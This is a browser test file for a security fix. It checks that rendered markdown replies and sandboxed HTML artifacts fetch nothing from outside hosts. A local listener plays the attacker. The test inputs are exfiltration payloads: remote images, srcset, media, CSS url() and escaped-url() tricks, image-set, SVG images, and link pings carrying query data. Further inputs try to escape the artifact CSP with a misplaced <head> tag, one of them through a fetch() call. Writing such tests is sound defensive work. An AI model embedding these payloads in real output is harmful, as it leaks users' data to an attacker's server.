// Security fix F2-1 (docs/security/fix-run.md): drawing a reply, a digest or an artifact must never fetch anything from another host.
// A local listener stands in for the attacker; the markdown renderer and the artifact builder run in real Chromium (Vite dev server).
// Run alone: node --test --test-force-exit tests/browser/sec-exfil.test.js
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import path from 'node:path';
import { createServer } from 'vite';
import { chromium } from 'playwright';
import { ROOT } from '../../server/core/config.js';

const VITE_PORT = 5197;
let vite; let browser; let page; let listener; let port; const hits = [];

before(async () => {
  listener = http.createServer((req, res) => { hits.push(req.url); res.writeHead(200, { 'content-type': 'image/gif' }); res.end(); });
  await new Promise((ok) => listener.listen(0, '127.0.0.1', ok));
  port = listener.address().port;
  vite = await createServer({ configFile: path.join(ROOT, 'vite.config.js'), server: { port: VITE_PORT, strictPort: true }, logLevel: 'error' });
  await vite.listen();
  // Chrome refuses page-to-loopback requests on its own (local network access); a real attacker's host is public, so switch that off
  const args = ['--disable-features=LocalNetworkAccessChecks,PrivateNetworkAccessSendPreflights,PrivateNetworkAccessRespectPreflightResults,BlockInsecurePrivateNetworkRequests'];
  browser = await chromium.launch({ channel: 'chrome', headless: true, args }).catch(() => chromium.launch({ headless: true, args }));
  page = await browser.newPage();
  // a blank page on the Vite origin, so the app's modules can be imported without starting the app
  await page.route(`http://localhost:${VITE_PORT}/sec-blank.html`, (r) => r.fulfill({ contentType: 'text/html', body: '<!doctype html><html><head><meta charset="utf-8"></head><body></body></html>' }));
  await page.goto(`http://localhost:${VITE_PORT}/sec-blank.html`);
});

after(async () => { await browser?.close(); await vite?.close(); listener?.close(); });

const settle = () => new Promise((r) => setTimeout(r, 800));

test('F2-1: a reply or digest with remote images, media, styles or fonts fetches nothing', async () => {
  hits.length = 0;
  const html = await page.evaluate(async (p) => {
    const { renderMarkdown } = await import('/src/core/markdown.js');
    const u = (x) => `http://127.0.0.1:${p}/${x}?q=subjects`;
    const md = [
      `Summary done. ![](${u('md-image')})`,
      `<img src="${u('raw-img')}"> <img srcset="${u('srcset')} 1x"> <video poster="${u('poster')}" src="${u('video')}"></video> <audio src="${u('audio')}"></audio>`,
      `<video><source src="${u('source')}"></video> <picture><source srcset="${u('picture')}"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></picture> <input type="image" src="${u('input')}">`,
      `<span style="background:url(${u('style-attr')})">x</span> <style>body{background:url(${u('style-tag')})} @import url(${u('import')});</style> <a href="${u('link')}" ping="${u('ping')}">a link</a>`,
      // R1-2: CSS functions other than url(, and CSS escapes, in a style or an SVG presentation attribute
      `<span style="background-image:image-set('${u('image-set')}' 1x)">i</span> <span style="background:\\75 rl(${u('style-escaped')})">e</span> <svg width="9" height="9"><rect width="9" height="9" fill="\\75 rl(${u('fill-escaped')})"/></svg>`,
      `<svg><image href="${u('svg-image')}"/></svg> <table background="${u('table-bg')}"><tr><td>t</td></tr></table>`,
      '| Day | Time | Event |\n|---|---|---|\n| Today | 10:00 | ![](' + u('calendar-title') + ') |',
    ].join('\n\n');
    const d = document.createElement('div');
    d.innerHTML = renderMarkdown(md);
    document.body.append(d);
    return d.innerHTML;
  }, port);
  await settle();
  assert.deepEqual(hits, [], `requests reached the listener: ${hits.join(', ')}`);
  assert.match(html, /href="http:\/\/127\.0\.0\.1/); // links stay links (a click is the person's own action)
  assert.match(html, /data:image\/gif/); // data: images still show
});

test('F2-1: an artifact cannot escape its CSP with <head> in a comment, a script string, or content before <head>', async () => {
  hits.length = 0;
  await page.evaluate(async (p) => {
    const { buildSrcdoc } = await import('/src/core/artifact-renderer.js');
    const u = (x) => `http://127.0.0.1:${p}/${x}`;
    const docs = [
      `<!--<head>--><html><head></head><body><img src="${u('art-comment')}"></body></html>`,
      `<script>var s = "<head>";</script><img src="${u('art-script')}">`,
      `<img src="${u('art-before')}"><html><head><title>x</title></head><body>hi</body></html>`,
      `<html><head><title>x</title></head><body><img src="${u('art-plain')}"><script>fetch("${u('art-fetch')}")</script></body></html>`,
    ];
    for (const src of docs) {
      const f = document.createElement('iframe');
      f.setAttribute('sandbox', 'allow-scripts');
      f.srcdoc = await buildSrcdoc('html', src);
      document.body.append(f);
    }
  }, port);
  await settle();
  assert.deepEqual(hits, [], `requests reached the listener: ${hits.join(', ')}`);
});
